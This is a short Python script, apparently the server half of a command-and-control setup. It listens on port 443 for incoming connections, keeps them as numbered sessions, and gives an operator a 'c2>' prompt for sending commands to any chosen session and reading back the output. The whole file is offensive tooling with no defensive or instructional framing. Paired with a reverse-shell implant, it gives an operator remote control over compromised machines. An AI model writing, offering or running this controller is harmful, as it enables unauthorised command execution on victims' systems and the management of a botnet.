import socket
import threading

sessions = {}  # id -> connection
counter = 0


def handle(conn, sid):
    sessions[sid] = conn
    print("[+] session", sid, "connected")


def listener():
    global counter
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", 443))
    s.listen(50)

    while True:
        conn, addr = s.accept()
        counter += 1
        threading.Thread(target=handle, args=(conn, counter), daemon=True).start()


def operate():
    while True:
        cmd = input("c2> ")
        sid, _, command = cmd.partition(" ")
        conn = sessions.get(int(sid))

        if conn:
            conn.send(command.encode())
            print(conn.recv(4096).decode(errors="ignore"))


threading.Thread(target=listener, daemon=True).start()
operate()